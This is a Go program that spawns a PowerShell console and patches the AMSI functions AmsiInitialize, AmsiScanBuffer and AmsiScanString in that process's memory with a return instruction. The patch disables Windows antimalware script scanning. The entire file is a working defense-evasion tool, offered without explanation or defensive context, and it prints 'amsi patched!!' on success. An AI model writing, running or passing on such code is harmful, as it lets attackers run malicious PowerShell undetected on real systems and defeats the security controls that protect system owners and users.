package main

import (
	"fmt"
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
)

var(
	fntdll = syscall.NewLazyDLL("amsi.dll")
	AmsiScanBuffer  = fntdll.NewProc("AmsiScanBuffer")
	AmsiScanString  = fntdll.NewProc("AmsiScanString")
	AmsiInitialize  = fntdll.NewProc("AmsiInitialize")
	k32 = syscall.NewLazyDLL("kernel32.dll")
	WriteProcessMemory  = k32.NewProc("WriteProcessMemory")
)


func main(){
	si := new(syscall.StartupInfo)
	pi := new(syscall.ProcessInformation)
	si.Cb = uint32(unsafe.Sizeof(si))
	err2 := syscall.CreateProcess(nil, syscall.StringToUTF16Ptr("powershell -NoExit"), nil, nil, false, windows.CREATE_NEW_CONSOLE, nil, nil, si, pi)
	if err2 != nil {
		panic(err2)
	}

	hProcess := uintptr(pi.Process)
	hThread := uintptr(pi.Thread)

	var oldProtect uint32
	var old uint32
	var patch = []byte{0xc3}

	windows.SleepEx(500,false)

	fmt.Println("patching amsi ......")

	amsi := []uintptr{
		AmsiInitialize.Addr(),
		AmsiScanBuffer.Addr(),
		AmsiScanString.Addr(),
	}

	var e error
	var r1 uintptr

	for _,baseAddr := range amsi{
		e = windows.VirtualProtectEx(windows.Handle(hProcess), baseAddr, 1, syscall.PAGE_READWRITE, &oldProtect)
		if e != nil {
			fmt.Println("virtualprotect error")
			fmt.Println(e)
			return
		}
		r1,_,e = WriteProcessMemory.Call(hProcess,baseAddr, uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)),0)
		if r1 == 0{
			fmt.Println("WriteProcessMemory error")
			fmt.Println(e)
			return
		}
		e = windows.VirtualProtectEx(windows.Handle(hProcess), baseAddr, 1, oldProtect, &old)
		if e != nil {
			fmt.Println("virtualprotect error")
			fmt.Println(e)
			return
		}
	}


	fmt.Println("amsi patched!!\n")

	windows.CloseHandle(windows.Handle(hProcess))
	windows.CloseHandle(windows.Handle(hThread))

}